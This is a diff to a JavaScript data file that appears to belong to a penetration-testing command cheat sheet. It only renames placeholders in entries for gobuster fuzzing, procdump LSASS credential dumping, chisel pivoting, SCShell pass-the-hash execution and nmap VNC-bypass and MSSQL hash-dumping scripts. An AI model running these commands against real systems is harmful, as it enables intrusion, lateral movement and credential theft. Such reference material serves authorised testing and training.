@@ -27,7 +27,7 @@ var data = [
         "tool": "gobuster",
         "category": "ATTACK/FUZZ",
         "information": "Fuzz a web site with gobuster with classic extensions",
-        "command": "gobuster dir -u [url] -w [wordlist] -x php,html,txt,xml,md [add other] -o [outputfile]",
+        "command": "gobuster dir -u [url] -w [wordlist] -x php,html,txt,xml,md [add_other] -o [outputfile]",
         "link": "https://github.com/OJ/gobuster"
     },
     {
@@ -145,7 +145,7 @@ var data = [
         "tool": "Compile",
         "category": "CODE/COMPILE",
         "information": "Compile windows PE executable on linux",
-        "command": "i686-w64-mingw32-gcc -o [output.exe] [source.c] -lws2_32"
+        "command": "i686-w64-mingw32-gcc -o [output] [source] -lws2_32"
     },
     {
         "id": 22,
@@ -180,14 +180,14 @@ var data = [
         "tool": "procdump",
         "category": "POST-EXPLOITATION",
         "information": "Dump a process memory - local",
-        "command": "procdump.exe -accepteula -ma [pid or name] [output.dmp]"
+        "command": "procdump.exe -accepteula -ma [pid or name] [output]"
     },
     {
         "id": 27,
         "tool": "procdump",
         "category": "POST-EXPLOITATION",
         "information": "Dump a process memory - remote",
-        "command": "net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass.exe] [lsass.dmp]"
+        "command": "net use Z: https://live.sysinternals.com; Z:\\procdump.exe -accepteula -ma [lsass_exe] [lsass_dmp]"
     },
     {
         "id": 28,
@@ -315,7 +315,7 @@ var data = [
         "tool": "chisel",
         "category": "PIVOTING",
         "information": "chisel reverse port forwarding (client on remote machine) - forward client port on server",
-        "command": "chisel client -v [server_ip]:[server_port] R:[serverside-port]:[clientside-host|localhost]:[clientside-port]",
+        "command": "chisel client -v [server_ip]:[server_port] R:[serverside_port]:[clientside_host|localhost]:[clientside_port]",
         "link": "https://github.com/jpillora/chisel"
     },
     {
@@ -323,7 +323,7 @@ var data = [
         "tool": "chisel",
         "category": "PIVOTING",
         "information": "chisel remote port forwarding (client on remote machine) - forward server port on client",
-        "command": "chisel client -v [server_ip]:[server_port|8000] [clientside-host|0.0.0.0]:[clientside-port]:[serverside-host|127.0.0.1]:[serverside-port]",
+        "command": "chisel client -v [server_ip]:[server_port|8000] [clientside_host|0.0.0.0]:[clientside_port]:[serverside_host|127.0.0.1]:[serverside_port]",
         "link": "https://github.com/jpillora/chisel"
     },
     {
@@ -1102,7 +1102,7 @@ var data = [
         "tool": "SCShell",
         "category": "ATTACK/CONNECT",
         "information": "Stealthy psexec",
-        "command": "python3 scshell.py -service-name [service-name|defragsvc] -hashes :[ntlm-hash] [domain]/[user]@[ip]",
+        "command": "python3 scshell.py -service-name [service_name|defragsvc] -hashes :[ntlm_hash] [domain]/[user]@[ip]",
         "link": "https://github.com/Mr-Un1k0d3r/SCShell"
     },
     {
@@ -1611,7 +1611,7 @@ var data = [
         "tool": "nmap",
         "category":"RECON",
         "information": "VNC - nmap enum",
-        "command": "nmap -sV -p [Port|5900] --script=realvnc-auth-bypass,vnc-info,vnc-title [ip]",
+        "command": "nmap -sV -p [port|5900] --script=realvnc-auth-bypass,vnc-info,vnc-title [ip]",
         "link": "https://nmap.org/"
     },
     {
@@ -1716,7 +1716,7 @@ var data = [
         "tool": "nmap",
         "category":"RECON",
         "information": "mssql - enum",
-        "command": "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [PORT|1433] [IP]",
+        "command": "nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p [port|1433] [IP]",
         "link": "https://nmap.org/"
     },
     {
@@ -1748,7 +1748,7 @@ var data = [
         "tool": "netbios",
         "category":"RECON",
         "information": "nbtscan - scan netbios",
-        "command": "nbtscan -r [ip-range]",
+        "command": "nbtscan -r [ip_range]",
         "link": "https://github.com/charlesroelli/nbtscan"
     },
     {
